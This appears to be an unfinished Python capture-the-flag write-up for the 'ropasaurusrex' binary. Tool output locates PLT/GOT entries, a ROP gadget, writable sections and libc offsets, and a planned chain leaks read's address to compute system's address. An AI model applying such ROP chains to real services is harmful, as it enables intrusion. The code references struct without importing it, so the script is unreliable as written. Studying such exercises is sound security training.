# write-up for ropasaurusax 32bit
# step by step process to write-up
# importent command for get information in binary and address in binary.

from struct import pack,unpack
from socket import create_connection

## this is function for packing address.
pack = lambda v, fmt='<I': struct.pack(fmt, v)

########### get address and idea
####### read ,write in __plt
###### with r2:

# [0x41417641]> afl | grep read
# 0x0804832c    1 6            sym.imp.read

# [0x41417641]> afl | grep write
# 0x0804830c    1 6            sym.imp.write

##### with objectdump:
# najeeb@najeeb:~/Downloads$ objdump -D -j .plt ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d | grep read
# 0804832c <read@plt>:
# najeeb@najeeb:~/Downloads$ objdump -D -j .plt ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d | grep write
# 0804830c <write@plt>:

###### GOT address
#[0x0804840f]> pd 1 @ sym.imp.read
#/ (fcn) sym.imp.read 6
#|   sym.imp.read ();
#|              ; CALL XREF from 0x08048416 (sub.read_3f4)
#\           0x0804832c      ff251c960408   jmp dword [reloc.read_28]   ; reloc.read_28

#### ROP with radare2 ===>>> pop;pop;pop;ret

#[0x0804840f]> e rop.len = 4
#[0x0804840f]> "/R/ pop;pop;pop;ret"
 # 0x080484b6                 5e  pop esi
 # 0x080484b7                 5f  pop edi
 # 0x080484b8                 5d  pop ebp
 # 0x080484b9                 c3  ret

#### saving exploit in binary we need permistion 'w' in this case both have
#### permistion but .bss have less space so go to .dynamic
# [0x0804840f]> S=~.bss
# 24  0x08049628 |--------------------------------------------------------------------------------| 0x08049630     8 -rw- .bss
# [0x0804840f]> S=~.dynamic
# 20  0x08049530 |-----------------------------------------------------------------------------###| 0x08049600   208 -rw- .dynamic
# [0x0804840f]>
'''
STAGE 1
--frame_1--
[write@plt]
[pppr     ] // return address
[1        ]
[read@got ]
[4        ]
--frame_2--
[read@plt ]
[pppr     ]
[0        ]
[writeaddr]
[len(cmd) ]
--frame_3--
[vuln_func]
'''

#### libc offset for read and system

# najeeb@najeeb:~/Music/ctf/rop$ gdb -q /lib/i386-linux-gnu/libc.so.6
# Reading symbols from /lib/i386-linux-gnu/libc.so.6...(no debugging symbols found)...done.
# (gdb) p system
# $1 = {<text variable, no debug info>} 0x3ada0 <system>
# (gdb) p read
# $2 = {<text variable, no debug info>} 0xd5b00 <read>
# (gdb) q

#######(imp) mathe for geting sysem offset
# offset = libc_read - libc_system
# sys_addr = leaked_read_addr - offset





# all necceary address
